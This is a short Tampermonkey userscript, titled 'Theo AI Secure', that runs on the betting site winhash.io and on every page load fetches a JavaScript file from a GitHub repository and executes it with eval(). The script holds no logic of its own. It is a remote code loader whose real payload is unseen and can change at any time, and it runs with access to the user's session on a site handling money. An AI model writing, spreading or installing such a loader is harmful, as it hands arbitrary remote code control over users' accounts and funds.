// ==UserScript==
// @name         Theo AI Secure
// @namespace    http://tampermonkey.net/
// @version      1.0
// @match        https://winhash.io/*
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(async function(){

const url =
"https://raw.githubusercontent.com/theosual30-bot/HiLoAiTheo/main/core.js?t=" + Date.now();

const res = await fetch(url);

const code = await res.text();

eval(code);

})();
